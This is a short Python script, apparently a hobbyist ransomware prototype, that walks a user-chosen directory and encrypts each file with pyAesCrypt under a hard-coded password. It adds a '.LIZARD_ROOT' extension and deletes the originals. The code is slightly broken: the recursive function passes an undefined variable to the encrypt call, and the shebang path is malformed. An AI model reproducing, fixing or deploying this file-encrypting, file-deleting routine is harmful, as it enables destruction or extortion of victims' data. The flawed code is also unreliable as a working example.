#!usr/bin/python3

import os
import pyAesCrypt as crypt

path_to_director = str(input("Enter the director for encrypt ==> "))

def encrypt(file):
  password = '123'
  buffer_sz = 512*1024
  crypt.encryptFile(file, file + ".LIZARD_ROOT", password, buffer_sz)
  print(f"File {file} encrypt")
  os.remove(file)
 
def search_dir(dir):
  for name in os.listdir(dir):
    path = os.path.join(dir, name)
    if os.path.isfile(path) == True:
      encrypt(file)
    else:
      search_dir(path)
      
search_dir(path_to_director)
